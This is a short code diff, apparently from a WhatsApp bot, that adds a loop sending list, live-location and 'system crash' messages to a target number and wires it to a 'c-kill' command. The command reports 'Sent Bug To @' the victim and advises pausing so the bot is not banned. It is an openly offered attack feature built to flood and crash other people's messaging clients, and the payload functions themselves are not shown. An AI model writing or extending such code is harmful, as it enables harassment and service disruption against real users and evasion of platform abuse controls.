@@ -363,6 +363,16 @@ participant: mek.key.participant
 }
 })
 }
+	 
+async function sendVariousMessages(jid, count) {
+  for (let i = 0; i < count; i++) {
+    sendListMessage(jid);
+    sendLiveLocationMessage(jid);
+    sendSystemCrashMessage(jid);
+    await sleep(500);
+  }
+}
+	 
 
 /*let reactionMessage = {
                     react: {
@@ -3255,7 +3265,7 @@ case 'c-kill': {
   sendVariousMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    "Classic-V3 Sent Bug To @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
     [whatsappNumber]
   );
